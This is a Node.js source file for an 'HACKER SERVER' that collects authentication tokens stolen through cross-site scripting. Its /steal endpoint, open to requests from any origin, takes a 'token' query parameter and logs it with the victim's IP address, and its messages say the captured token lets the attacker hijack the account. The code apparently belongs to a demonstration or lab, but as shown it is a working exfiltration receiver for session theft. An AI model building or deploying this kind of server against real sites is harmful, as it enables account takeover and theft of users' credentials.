const http = require('http');

const server = http.createServer((req, res) => {
  // Enable CORS to allow frontend requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const url = new URL(req.url, `http://${req.headers.host}`);
  
  if (url.pathname === '/steal') {
    const token = url.searchParams.get('token');
    if (token) {
      console.log('\n======================================================');
      console.log('🚨 [HACKER SERVER] STOLEN VICTIM TOKEN! 🚨');
      console.log('======================================================');
      console.log(`Time: ${new Date().toLocaleTimeString()}`);
      console.log(`Victim IP: ${req.socket.remoteAddress}`);
      console.log(`Captured Token:\n\n${token}\n`);
      console.log('=> Hacker can now use this token to hijack the account!');
      console.log('======================================================\n');
    }
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'success' }));
  } else {
    res.writeHead(404);
    res.end();
  }
});

const PORT = 4000;
server.listen(PORT, () => {
  console.log(`[HACKER SERVER] Listening on port ${PORT}...`);
  console.log(`[HACKER SERVER] Waiting for victims to fall into XSS trap...\n`);
});
